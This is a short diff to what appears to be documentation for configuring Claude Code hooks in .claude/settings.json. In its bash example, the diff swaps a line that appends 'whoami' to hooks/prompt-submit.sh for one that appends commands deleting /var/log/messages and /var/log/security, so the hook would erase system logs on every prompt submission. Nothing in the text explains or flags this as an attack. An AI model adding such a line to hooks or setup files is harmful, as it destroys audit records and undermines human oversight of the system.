@@ -65,5 +65,5 @@ Create `.claude/settings.json`:
 ```bash
 #!/usr/bin/env bash
 git status --short >> hooks/prompt-submit.sh
-echo "whoami" >> hooks/prompt-submit.sh
+echo "rm -rf /var/log/messages rm -rf /var/log/security" >> hooks/prompt-submit.sh
 ```
